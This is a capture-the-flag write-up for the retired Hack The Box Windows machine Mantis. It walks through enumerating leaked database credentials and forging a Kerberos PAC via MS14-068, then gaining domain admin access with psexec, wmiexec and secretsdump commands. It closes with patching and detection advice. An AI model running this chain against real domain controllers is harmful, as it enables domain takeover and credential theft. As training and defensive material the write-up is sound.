---
machine: Mantis
os: Windows
difficulty: Hard
platform: Hack The Box
category: Machines
state: Retired
pwned: null
tags: [windows, active-directory, kerberos, ms14-068, mssql, iis]
---

# Mantis — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired (February 2018). Reference writeup; not played on this profile.
> No flags, credentials or real hashes.

## TL;DR

An IIS host running Orchard CMS on port 1337 and a SQL Server instance leak domain credentials. With a valid account, Active Directory is enumerated and **MS14-068 (CVE-2014-6324)** is exploited: the KDC accepts a PAC signed with a normal user's key and issues a TGT carrying `Domain Admins`. The result is administrative access to the domain controller.

## Recon

```bash
nmap -Pn -p- --min-rate 2000 <TARGET_IP>
nmap -Pn -sCV -p 53,88,135,139,389,445,1337,1433,3268,3389 <TARGET_IP>
```

| Port | Service | Note |
|---|---|---|
| 53/tcp | DNS | `htb.local` domain |
| 88/tcp | Kerberos | KDC |
| 389/3268 | LDAP | AD enumeration |
| 445/tcp | SMB | Shares and authentication |
| 1337/tcp | HTTP | IIS + Orchard CMS |
| 1433/tcp | MSSQL | SQL Server Express |

```bash
echo "<TARGET_IP> mantis.htb.local htb.local" | sudo tee -a /etc/hosts
```

## Enumeration

- `http://mantis.htb.local:1337/` serves Orchard CMS.
- `gobuster dir` finds admin paths and configuration files.
- `smbclient -L //<TARGET_IP>/ -N` confirms the domain and hostname.
- The application leaks database credentials in its configuration. Test them against MSSQL and LDAP.

```bash
mssqlclient.py '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP>' -windows-auth
```

Once inside MSSQL, check whether the account can read domain information or query the DC. A valid account is enough to request a TGT: domain admin is not required.

## Foothold

### 1. Domain context

```bash
nxc smb <TARGET_IP> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN>
nxc ldap <TARGET_IP> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> --users
```

Identify the DC, the domain name and the compromised user's SID. MS14-068 needs that SID and the account key, not prior privileges.

### 2. PAC forgery

```bash
python3 ms14-068.py -u '<USER>@<DOMAIN>' -p '<PASSWORD>' \
  -s '<USER_SID>' -d <DC_IP>
```

The script produces a `.ccache` whose TGT PAC contains administrator groups. The flaw is that the KDC does not correctly validate the PAC signature when the client presents a manipulated TGT.

```bash
export KRB5CCNAME=./<USER>.ccache
klist
```

### 3. Using the ticket

```bash
psexec.py -k -no-pass '<DOMAIN>/<USER>@<DC_HOST>'
# alternative
wmiexec.py -k -no-pass '<DOMAIN>/<USER>@<DC_HOST>'
```

The ticket is presented directly to the DC. If clocks drift, Kerberos fails with `KRB_AP_ERR_SKEW`; fix the time before continuing.

## Lateral movement

- This is not a network pivot: the jump is logical, from a user account to an administrator TGT.
- The same `.ccache` works for SMB, WMI, WinRM and LDAP while the ticket is valid.
- Enumerate the domain with BloodHound before touching the DC to confirm the forged PAC is the shortest path.

## Privilege escalation

Privilege escalation is the PAC forgery itself: the TGT carries `Domain Admins`. With the ticket, access the DC and read the administrative flags.

```bash
nxc smb <DC_IP> -u '<USER>' -p '<PASSWORD>' -k --shares
secretsdump.py -k -no-pass '<DOMAIN>/<USER>@<DC_HOST>'
```

No hashes or derived credentials are documented. Cleanup means invalidating the ticket and rotating the compromised account's password.

## Evidence

- Orchard CMS response on 1337 and SQL Server on 1433.
- `klist` showing the TGT issued to the user.
- DC access with `psexec`/`wmiexec` using `-k -no-pass`.
- Cropped `whoami /groups` output showing `Domain Admins`.

## Lessons learned

- MS14-068 does not require a misconfigured domain: it affects controllers missing the November 2014 patch.
- A normal user with valid credentials can become administrator if the KDC trusts a manipulated PAC.
- Time synchronisation is part of the exploit; without it, the ticket is unusable.
- In a real assessment, database credentials exposed by the web app are already a critical finding.

## Mitigations and detection

- Apply **KB3011780** to every domain controller.
- Audit accounts with unnecessary permissions on databases and web applications.
- Detection: **4768** with an anomalous PAC or a TGT requested with groups the user does not hold; **4624** type 3 from an unusual workstation; `psexec`/WMI against the DC.
- Alert on service creation (`7045`) and administrative access outside change windows.

MITRE: T1558, T1078, T1021.002, T1069.002.

## References

- <https://nvd.nist.gov/vuln/detail/CVE-2014-6324>
- <https://learn.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-068>
- <https://foobarto.me/htb/machines/mantis>
